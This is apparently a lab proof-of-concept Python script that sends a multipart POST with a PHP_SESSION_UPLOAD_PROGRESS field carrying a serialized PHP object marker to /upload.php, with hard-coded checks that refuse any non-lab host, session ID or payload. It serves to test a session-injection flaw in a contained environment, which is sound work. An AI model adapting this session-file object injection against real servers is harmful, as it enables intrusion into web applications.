#!/usr/bin/env python3

import http.client
import sys
import time

if len(sys.argv) != 5:
    raise SystemExit("Invalid probe arguments")

host = sys.argv[1]
try:
    port = int(sys.argv[2])
except ValueError:
    raise SystemExit("Invalid lab port")

sid = sys.argv[3]
progress_text = sys.argv[4]

if host != "session-mismatch-nginx" or port not in {8080, 8081}:
    raise SystemExit("Refusing non-lab network target")
if sid != "lab115560":
    raise SystemExit("Refusing unexpected session ID")
if progress_text != 'lab|O:9:"LabMarker":0:{}|':
    raise SystemExit("Refusing unexpected progress marker")

progress = progress_text.encode("utf-8")

boundary = "----local-cve-2026-115560-boundary"
marker = boundary.encode("ascii")
upload = b"A" * (256 * 1024)

body = b"".join([
    b"--" + marker + b"\r\n",
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n',
    progress + b"\r\n",
    b"--" + marker + b"\r\n",
    b'Content-Disposition: form-data; name="upload"; filename="lab.bin"\r\n',
    b"Content-Type: application/octet-stream\r\n\r\n",
    upload + b"\r\n",
    b"--" + marker + b"--\r\n",
])

headers = {
    "Content-Type": "multipart/form-data; boundary=" + boundary,
    "Cookie": "PHPSESSID=" + sid,
}

for attempt in range(30):
    conn = http.client.HTTPConnection(host, port, timeout=20)

    try:
        conn.request("POST", "/upload.php", body=body, headers=headers)
        response = conn.getresponse()
        response_body = response.read().decode("utf-8", "replace")
        status = response.status
        conn.close()

        if status in (502, 504) and attempt < 29:
            time.sleep(0.5)
            continue

        print("HTTP_STATUS=" + str(status))
        print("HTTP_BODY_BEGIN")
        print(response_body, end="" if response_body.endswith("\n") else "\n")
        print("HTTP_BODY_END")

        sys.exit(0 if status == 200 else 3)

    except OSError:
        conn.close()
        if attempt == 29:
            raise
        time.sleep(0.5)

sys.exit(4)
